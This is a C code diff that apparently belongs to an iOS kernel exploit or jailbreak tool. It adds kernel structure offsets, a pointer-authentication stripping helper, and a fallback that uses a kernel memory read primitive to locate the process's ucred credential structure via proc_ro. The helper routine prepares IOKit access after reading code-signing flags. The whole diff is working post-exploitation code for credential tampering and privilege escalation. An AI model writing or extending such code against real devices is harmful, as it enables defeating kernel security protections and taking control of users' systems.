@@ -28,6 +28,8 @@ static const uint32_t PROC_NEXT_OFFSET = 0x08;      // p_list le_next
 static const uint32_t PROC_PREV_OFFSET = 0x00;      // p_list le_prev
 static const uint32_t PROC_PFLAG_OFFSET = 0x454;
 static const uint32_t ARM_SS_OFFSET = 0x8;
+static const uint32_t PROC_PROC_RO_OFFSET = 0x18;
+static const uint32_t UCRED_CR_LABEL_OFFSET = 0x78;
 uint64_t PROC_STRUCT_SIZE;
 uint32_t TASK_TNEXT_OFFSET;
 uint32_t THREAD_MUPCB_OFFSET;
@@ -148,6 +150,13 @@ static bool is_kptr(uint64_t p) {
     return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
 }
 
+static inline uint64_t xpaci(uint64_t a);
+
+static inline uint64_t sign_kernel_ptr(uint64_t value) {
+    if ((value >> 32) > 0xFFFF) return value | 0xFFFFFF8000000000ULL;
+    return value;
+}
+
 static void kernel_logf(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
 static void kernel_logf(const char *fmt, ...) {
     char buffer[1024];
@@ -213,6 +222,38 @@ static uint32_t find_ucred_offset(uint64_t proc) {
         }
     }
 
+    return 0;
+}
+
+static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
+    uint64_t procRoRaw = ds_kread64(proc + PROC_PROC_RO_OFFSET);
+    uint64_t procRo = sign_kernel_ptr(xpaci(procRoRaw));
+    if (!is_kptr(procRo)) {
+        kernel_logf("prepareIOKitAccess: proc_ro pointer invalid");
+        return 0;
+    }
+
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = ds_kread64(procRo + off);
+        uint64_t candidates[3] = {
+            raw,
+            sign_kernel_ptr(xpaci(raw)),
+            sign_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
+        };
+
+        for (size_t i = 0; i < 3; i++) {
+            uint64_t cand = candidates[i];
+            if (!is_kptr(cand)) continue;
+
+            uint64_t label = sign_kernel_ptr(xpaci(ds_kread64(cand + UCRED_CR_LABEL_OFFSET)));
+            if (!is_kptr(label)) continue;
+
+            kernel_logf("prepareIOKitAccess: using proc_ro ucred pointer at +0x%x", off);
+            return cand;
+        }
+    }
+
+    kernel_logf("prepareIOKitAccess: proc_ro ucred scan failed");
     return 0;
 }
 
@@ -297,20 +338,24 @@ static int prepareIOKitAccess(void) {
 
     kernel_logf("prepareIOKitAccess: csflags offset = 0x%x", csflagsOff);
 
-    uint32_t ucredOff = (uint32_t)getucredooffset();
+    uint32_t ucredOff = (uint32_t)getucredoffset();
     if (!ucredOff) {
         ucredOff = find_ucred_offset(self);
     }
-    if (!ucredOff) {
-        kernel_logf("prepareIOKitAccess: could not resolve ucred offset");
-        return -1;
+    uint64_t ucred = 0;
+    if (ucredOff) {
+        kernel_logf("prepareIOKitAccess: ucred offset = 0x%x", ucredOff);
+        ucred = ds_kread64(self + ucredOff);
+    } else {
+        kernel_logf("prepareIOKitAccess: could not resolve ucred offset, trying proc_ro fallback");
     }
 
-    kernel_logf("prepareIOKitAccess: ucred offset = 0x%x", ucredOff);
-
-    uint64_t ucred = ds_kread64(self + ucredOff);
     if (!is_kptr(ucred)) {
-        kernel_logf("prepareIOKitAccess: invalid ucred pointer");
+        ucred = find_ucred_from_proc_ro(self);
+    }
+
+    if (!is_kptr(ucred)) {
+        kernel_logf("prepareIOKitAccess: invalid ucred pointer after fallback");
         return -1;
     }
 
